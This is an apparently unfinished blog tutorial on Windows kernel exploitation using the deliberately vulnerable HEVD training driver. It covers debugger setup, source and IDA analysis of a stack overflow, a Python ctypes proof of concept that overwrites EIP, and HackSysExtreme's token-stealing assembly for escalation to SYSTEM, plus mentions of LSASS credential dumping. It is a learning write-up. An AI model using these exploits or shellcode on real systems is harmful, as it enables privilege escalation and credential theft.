---
title:  "(UNDER CONSTRUCTION) Exploit Development: Windows Kernel Exploitation Part 1 - Debugging Environment and Stack Overflow"
date:   2019-09-21
tags: [posts]
excerpt: "An introduction to creating a kernel debugging environment with WinDbg and IDA to analyze and exploit a vulnerable kernel driver."
---
Introduction
---
As I am currently preparing for Offensive Security's [Advanced Windows Exploitation](https://www.offensive-security.com/documentation/advanced-windows-exploitation.pdf) course, I realized I had a disconnect with some prerequisite knowledge needed to succeed in the course (and in my personal exploit development growth). Among those topics, was kernel exploitation in a Windows environment. A professor, whom I am very close with, once explained to me many moons ago about kernel debugging. He explained it was done remotely, instead of locally (which is what I currently had experience with up until this point). Up until now, that was the only knowledge I had about anything related to the kernel.

Today, I just wanted to document a few things I have done in preparation for the AWE course coming up this year at BlackHat (where I will opefully get a seat). Among these are: how to use WinDbg at a high level (I have experience with WinDbg, but I want to get better, as this is what is used in the AWE course), how to use IDA freeware at a high level (reasoning is synonymous with WinDbg explanation), and how to exploit a vulnerable Windows kernel driver. 

The vulnerable driver I will be analyzing and exploiting today is from the HackSysExtreme team, with their [HackSysExtreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) (HEVD). I cannot stress enough how much HackSysExtreme has done for vulnerability researchers. With that said, let's get into the debugging environment setup.

Setting up the Debugging Environment
---
For our purposes, we will need four things:

1. Windows 7 32-bit VM (need a 32-bit OS)
2. [WinDbg](https://www.microsoft.com/en-us/download/details.aspx?id=8279) (our debugger for remote kernel debugging. Just install the debugging tools.)
3. [IDA freeware](https://www.scummvm.org/news/20180331/) (for disassembly and analyzing the vulnerability)
4. [OSRLOADER](https://www.osronline.com/OsrDown.cfm/osrloaderv30.zip) (for loading the driver)

I will be chaining this blog post with future posts to create a series on the other various kernel exploitation methods HEVD provides us to practice with. Eventually, this means 64-bit exploitation will be covered. In the meantime, we have to learn to walk before we can run.

Once the Windows 7 VM has been installed, we need to configure it for debugging. Firstly, we will need to create an environmental variable for the OS itself. Documentation is found [here](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/symbol-path) (scroll down to the _Controlling the Symbol Path_ section to see more). This variable is created so symbols can be resolved globally (as far as I can tell).

To get to the variable editor...

Select __Start__ > right click on __Computer__ and select __Properties__ > __Advanced system settings__ > __Environmental Variables__ > __System variables__. Select __New__:

Enter a __Variable name__ of: `_NT_SYMBOL_PATH`

Enter a __Variable value__ of: `SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols`

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_1.png" alt="">

Next, we will use a tool within Windows known as [BCDEdit](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options). BCDEdit is used to perform action such as: creating or modifying stores that are used to describe boot settings and manipulating boot menu options. We will be doing this, so the machine we will be analyzing (known as the Debugee) can be booted into kernel debugging mode, so analysis can be performed on the WinDbg machine (the Debugger).

Open __cmd.exe__ as Administrator, and replicate the following commands:

```terminal
bcdedit.exe /copy {current} /d "HEVD"
bcdedit.exe /debug {VALUE_FROM_ABOVE_COMMAND_SEE_IMAGES_BELOW_} on
bcdedit.exe /dbgsettings
```

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_2.png" alt="">
This will make a copy of a specified boot entry.

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_3.png" alt="">
This enables kernel debugging for the specified boot entry mentioned above.

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_4.png" alt="">
This displays the global debugger settings for the system.

Essentially, this enables kernel debugging over a serial port (virtual serial port in our case).

Reboot the machine, to verify the changes have been configured properly:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_5.png" alt="">

Don't boot into any mode. Instead, go ahead and shut down the machine again. There is one more task to complete to setup the environment.

Next, we need to duplicate, or clone, the Debugger VM to create the Debugee. To do this...

Right click on the VM tab in VMware and select __Manage__ > __Clone__ > __Next__ > Keep the current option of __The current state...__ > __Create a linked clone__ > Name the VM something like __Debugee__ > __Finish__.

Lastly, there needs to be a named pipe create for the VMs to talk. In order to do this, add a serial port to your Debugger machine, configured with the following options:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_6.png" alt="">

I am using Debian Linux as my Host OS. What this means, is that if you have a Windows host OS, you should not name your named pipe something like `/tmp/whatever_name`. Instead, use the naming convention `\\.\pipe\whatever_name`. 

With the named pipe configured the way it is, this means a named pipe between my Debugger machine and my host machine will be created. Then, in turn, the Debugee will connect, via that newly created named pipe, to the Debugger machine (allowing for remote debugging). 

Notice the option for __Server__ --> __An Application__ is marked. This is very important. 

Then, on the Debugee machine, configure the same named pipe (but this time select the __Client__ --> __An Application__ option):

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_7.png" alt="">

Perfect, everything is ready to go. Firstly, boot the Debugger machine firstly (very important) and select "Windows 7" in the boot menu.

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_5.png" alt="">

After booting, open up WinDbg and then open a __Command__ window by selecting from the toolbar at the top of the screen...

__View__ > __Command__:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_9.png" alt="">
Note, my colors will be different than yours. You can customize WinDbg by researching on Google. You can also configure WinDbg to boot with all important windows open, as shown below. I would highly recommend this.

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_10.png" alt="">


Then, press `Ctrl + K` and select the following options:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_8.png" alt="">

Press __OK__. Observe below that the Debugger machine is ready to accept incoming serial connections:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_11.png" alt="">

Let's move on to the Debugee machine. Now, boot the debugging machine, and select the __HEVD [debugger enabled]__ boot option.

Looking back at the Debugger option, you should see a connection! Take a look:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_12.png" alt="">

If you do not see a connection, here is a piece of troubleshooting advice I learned while doing this. Turn off both of your machines. Boot the Debugee (in __HEVD [debugger enabled]__ option) with no Debugger attached. Let everything boot and login. After that, turn off the machine, and try reconnecting again.

Just a few more housekeeping items.

Pause execution by selecting the __break__ option (looks like a pause button near the __Window__ toolbar option at the top of the WinDbg application).

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_13.png" alt="">

Next, in WinDbg, type the following commands in the __Command__ window:

```terminal
!sym noisy
ed nt!kd_default_mask_8
```
<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_15.png" alt="">

The first command turns on verbosity when loading symbols. The second command enabled kernel tracing, which allows us for additional verbosity when debugging.

Generally, the next step is to reload the symbols. I prefer to wait until the driver is loaded. Resume execution by executing the command `g` in the command window:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_16.png" alt="">

Loading the Driver
---

Now that the Debugee machine is running again, go over to it. Grab a copy of [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases). Also, grab a copy of OSRLOADER (link is above in the "what you'll need preface to the debugging environment setup above).

Start OSRLOADER as an Administrator. Open the __HEVD.sys__ file from the following path (or wherever the HEVD folder is):

`C:\Users\ANON\Desktop\HEVD.2.00\HEVD.2.00\drv\vulnerable\i386\HEVD.sys`

Choose __HEVD__ to be loaded as automatic. Select __Register Service__ and then __Start Service__ (all configuration options are shown in the screenshot below):

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_17.png" alt="">


Notice we are using the 32-bit driver.

Next, come back over to the Debugger machine, and you should see the driver is loaded:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_18.png" alt="">

Source Code
---

The single easiest way to identify vulnerabilities, is through source code review.

Let's take a look at a snippet from [BufferOverflowStack.c](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/BufferOverflowStack.c):

```c
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");

        //
        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Buffer Overflow Stack Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
BufferOverflowStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowStack(UserBuffer, Size);
    }

    return Status;
}

```
Before we analyze this, let's talk a bit about how user land communicates with things in the kernel land space.

User Land and Kernel Land Communication
---
Essentially, when it comes to Windows, user land and kernel land is conceptually logical at a high level.

There is a Windows API function known as [__DeviceIoConotrol__](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol) that is used for user land applications to communicate with kernel land drivers. At a lower level, this function is used to send a control code to a specified device driver to perform an action.

These control codes/actions are sent down the driver stack via an IRP (I/O Request Packet). IRPs are data structures that contain all of the parameters needed to fulfill an action. Here is what the device stack looks like when an IRP is passed down the stack for a device called __"SOME DEVICE"__:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_21.png" alt="">

The __filter DO__, __FDO__, and __PDO__ objects are all part of a [__DEVICE_OBJECT__ structure](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/ns-wdm-_device_object). They are used to represent a logical, virtual, or physical device that handles I/O requests (IRPs).

The __filter DO__ is an optional driver that can manipulate the value/modify the behavior of a device.

The __FDO__ is the main driver of a device. It provides the interface for operations and it handles reads/writes to the device.

The __PDO__ is the lowest level object in the stack. It represents a bus controller, adapter, or bridge.

More information can be found [here](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/bus-drivers).

Looking at the above image, you can see that an IRP moves down the stack to see if it was intended for __2.sys__ (which is a driver file). If it is intended, it will stop and never reach __3.sys__. If the IRP is not meant for __2.sys__, it will continue down the stack until it reaches __3.sys__.

This means that the IRP is getting passed down the device stack, until it reaches the correct IOCTL (`DeviceIoControl()` Windows API function) within one of those __.sys__ files.

Now that we have a little more background, let's take a look at the end snippet of the program.

Vulnerability Analysis
---

```c
/// <summary>
/// Buffer Overflow Stack Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
BufferOverflowStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowStack(UserBuffer, Size);
    }

    return Status;
}
```

Take a look at the comments before the code. This is the IOCTL Handler. An IOCTL handler will accept a successful IRP that is intended for that given IOCTL.

As you can see here, `BufferOverflowStackIoctlHandler()`  is the IOCTL handler refered to in the last sentence. It is accepting an IRP and the stack pointer.

Take a look at the `#else` snippet more closely:

```c
        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");

        //
        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
```

The RtlCopyMemory() is a routine that copies memory to a destination location.

As you can tell, the __Size__ parameter is directly copied down, without any validation of the actual size.

In total, here is what is happening between the `BufferOverflowStackIoctlHandler()` and`TriggerStackOverflow()` functions:

If an IRP makes it to the `BufferOverflowStackIoctlHandler()`, a __UserBuffer__ and a __Size__ parameter are readily available. One accepts user input (__UserBuffer__) and one contains the size (__Size__) of that user supplied buffer. 

That user input (__UserBuffer__) will be directly copied to the `TriggerBufferOverflowStack()` function, along with the size (__Size__). `TriggerBufferOverflow()` is the place that actually contains the vulnerability. This function then takes that previously inputted data from the user, of any size, and directly copies it into the __KernelBuffer__ parameter, via the `RtlCopyMemory()` function.

Great. We know a stack overflow condition exists within HEVD. Let's go analyze this in IDA.

IDA Analysis
---

Open up the __HEVD.sys__ driver file loaded with OSRLOADER earlier.

Take a look at the functions present:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_22.png" alt="">

Let's take a look at the `IrpDeviceIoCtlHandler()` function, which handles IRP requests to IOCTLs.

As you can see below, there are many IOCTLs that are branched out. This is because an IRP will travel until it finds the applicable IOCTL that can fulfill the request:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_23.png" alt="">

As you can see, you can see the `StackOverflowIoctlHandler()` function. 

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_24.png" alt="">

__NOTE- I AM USING HEVD VERSION 2.00. THE SOURCE CODE ABOVE IS FOR HEVD 3.00. WHAT THIS MEANS IS__ `StackOverflowIoctlHandler()` __IS EXACTLY EQUAL TO__ `BufferOverflowStackIoctlHAndler()` __MENTIONED ABOVE IN THE SOURCE CODE ANALYSIS. THE NAMES ARE JUST DIFFERENT. THEY PERFORM THE EXACT SAME ACTION.__

Tracing back above, take a look at the IOCTL that references the `StackOverflowIoctlHandler()`. We see this set of instructions:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_25.png" alt="">

Essentially what this means, is if the IOCTL is equal to __0x222003__, we will jump into the `StackOverflowIoctlHAndler()`. Keep this in mind. Let's see where this takes us.

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_26.png" alt="">


Looking at the `StackOverflowIoctlHandler()` function, we eventualy will land in the `TriggerStackOverflow()` function. Let's see what is contained in that function:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_27.png" alt="">

As seen above- 800 hex bytes (2048 bytes) is the length of the __KernelBuffer__. However, as we know from the source code analysis, the buffer that will be copied into __KernelBUffer__, is not checked for size. Anything over 2048 bytes will crash the kernel, resulting in a BSOD (blue screen of death).

Proof of Concept
---

Now that we know we have a DOS on our hands, let's create a proof of concept to illustrate this. I will be utilizing Python [ctypes](https://docs.python.org/3/library/ctypes.html#module-ctypes), instead of just using C. The reason behind this is- the AWE course I want to eventually take uses ctypes, so I decided I will get use to them now.

Here is the PoC:

```python
# HackSysExtreme Vulnerable Driver Kernel Exploit (Stack Overflow)
# Author: Connor McGarr

import struct
import sys
import os
from ctypes import *

# Here, there is going to be a new function for each of the Windows API call.

# CreateFileA parameters
# HANDLE CreateFileA(
#   LPCSTR                lpFileName,
#   DWORD                 dwDesiredAccess,
#   DWORD                 dwShareMode,
#   LPSECURITY_ATTRIBUTES lpSecurityAttributes,
#   DWORD                 dwCreationDisposition,
#   DWORD                 dwFlagsAndAttributes,
#   HANDLE                hTemplateFile
# );

kernel32 = windll.kernel32

print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."

handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not handle or handle == -1:
    print "[+] Cannot get device handle..... Try again."
    sys.exit(0)


padding = "\x41" * 2080
padding += "\x42" * 4
padding += "\x43" * (3000 - len(padding))


paddingLength = len(padding)

# DeviceIoControl parameters
# BOOL DeviceIoControl(
#  HANDLE       hDevice,
#  DWORD        dwIoControlCode,
#  LPVOID       lpInBuffer,
#  DWORD        nInBufferSize,
#  LPVOID       lpOutBuffer,
#  DWORD        nOutBufferSize,
#  LPDWORD      lpBytesReturned,
#  LPOVERLAPPED lpOverlapped
# );

# 0X222003 = IOCTL code that will jump to TriggerStackOverflow() function

kernel32.DeviceIoControl(handle, 0x222003, padding, paddingLength, None, 0, byref(c_ulong()), None)
```

Let me explain the above code.

We are utilizing two Windows API functions here. Both are located in `kernel32.dll`. The two functions are `CreateFileA()` and `DeviceIoControl()`.

`DeviceIoControl()` is really the main function we are focusing on here. This function will allow us to directly interact with the IOCTL. This function's first parameter that needs to be fulfilled is `hDevice`. According to the [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol) on `DeviceIocontrol()`, `hDevice` referes to a handle to the device on which the operation is being performed. This handle first needs to be created with the `CreateFileA()` function.

Since the `CreateFileA()` function needs to be created first, we will start there. Use the [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) documentation to figure out which parameters you need. The same with `DeviceIoControl()`.

When it comes to the `padding` parameter, I already calculated the offset needed to control EIP. If all goes well, EIP should contain `42424242`- just like a normal vanilla stack buffer overflow.

Full Circle
---

Remember earlier we executed:

```terminal
!sym noisy
ed nt!kd_default_mask 8
```

I explained that we would eventually need to reload the symbols. Let's to this with the command, in WinDbg:

```terminal
.reload
```

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_28.png" alt="">

Verify the __HEVD__ module has been loaded with:

```terminal
lm m H*
```

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_32.png" alt="">

Then, execute `g` in the command window to let the Debugee run, so we can execute the PoC.

Executing the PoC crashes the Debugee:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_29.png" alt="">

And as you can clearly see from the images below, EIP is cleanly overwritten with `42424242`.

To see the registers in the command window, execute `r`:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_30.png" alt="">

To view the registers this way: __View__ > __Registers__ in the toolbar at the top of WinDbg:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_31.png" alt="">

To pass through the crash, we need to pass the exception. To do this, select __Debug__ > __Go Unhandled Exception__.

After passing the exception, again type `g` in the command window in WinDbg and execute.

As you can see, we get the BSOD- and the `42424242` value of EIP is again validated by the debugging information!!!:

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_33.png" alt="">

Where Do We Go From Here?
---

If you have followed any of my [previous posts](https://connormcgarr.github.io/posts/), you will know that once we can control EIP- it is basically game over. Whether that is through an exception handler or a direct return to the stack- once EIP is controlled, generally we would jump to some shellcode. That shellcode generally would be a bind or reverse shell.

With kernel exploitation, it is a bit different. Generally, with kernel exploitation, it is already assumed one has an initial foothold on a machine. With this in mind, we will shift our focus here.

The goal for our kernel exploit will be to elevate privileges to `NT_AUTHORITY\SYSTEM`, or the local administrator account.

You may be asking yourself "Why is this important if we already have access to the machine?"

Think about it from an Active Directory perspective. Let's say you are conducting a penetration test in an Active Directory environment. One of the objectives, most likely, will be to gain [Domain Administrator](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn579255(v%3Dws.11)#domain-admins) privileges.

One of the first steps to reach that goal, will the obtain local administrative privileges on an endpoint or server.

This will allow us to accomplish a couple of things with local administrator privileges:

1. Tools like [wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) require local administrative privileges

2. Edit things like [registry keys](https://attack.mitre.org/techniques/T1060/) for persistence

3. Ability to edit network configurations for network pivoting

4. Add or remove users

5. [Dump](https://adsecurity.org/?p=462) [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) memory in order to obtain (potential) plain text credentials or [NTLM](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) hashes of other users with sessions on that same machine.

6. A plethora of other options- creativity is your only limit here

Standard User Access Tokens & Administrative Access Tokens
---

The goal here is to introduce a piece of shellcode that will elevate us to `NT_AUTHORITY\SYSTEM`.

How do we do this?

First, let's take a look how Windows seperates the two main types of local accounts: users and local administrators. The following graphic is from the MSDN article about how [UAC works](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works):

<img src="{{ site.url }}{{ site.baseurl }}/images/HEVD_34.png" alt="">

The way that Windows discerns what level of privileges a user has, is through the logon process.

Essentially, when a standard user logs on, that user is assigned a standard user access token.

When an administrator logs on, that adminstrator is assigned TWO tokens: one standard user token and one administrative access token. The reason for this is because of the Windows model of least privilege. Anytime a user OR administrator performs an action, it is ran within context of their standard user access token. Only when an adminstrative action is performed, is the adminstrative access token presented to prove the identity trying to run an action in context of an adminstrative user.

Essentially- we can execute a piece of shellcode that possibly could take that `NT_AUTHORITY\SYSTEM` token and copy/replace it on top of the standard user access token granted to us (a standard user). One thing to keep in mind, is that this will need to be position agnostic shellcode. This means we don't rely on where we "drop in" for our shellcode- in terms of memory position.

Low Level Details
---

Before I get into any details, have a look at the [payload](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/Payloads.c) presented to us by HackSysExtreme:

```nasm
pushad                               ; Save registers state

; Start of Token Stealing Stub
xor eax, eax                         ; Set ZERO
mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread

; _KTHREAD is located at FS:[0x124]
mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process
mov ecx, eax                         ; Copy current process _EPROCESS structure
mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

SearchSystemPID:
mov eax, [eax + FLINK_OFFSET]        ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub eax, FLINK_OFFSET
cmp [eax + PID_OFFSET], edx          ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
; with SYSTEM process nt!_EPROCESS.Token
; End of Token Stealing Stub

popad                                ; Restore registers state
```

Before we begin analyzing this piece of assembly above, let's start with some fundamentals.

The 'KPCR' - or __Kernel Processory Control Region__.

Within Windows, 
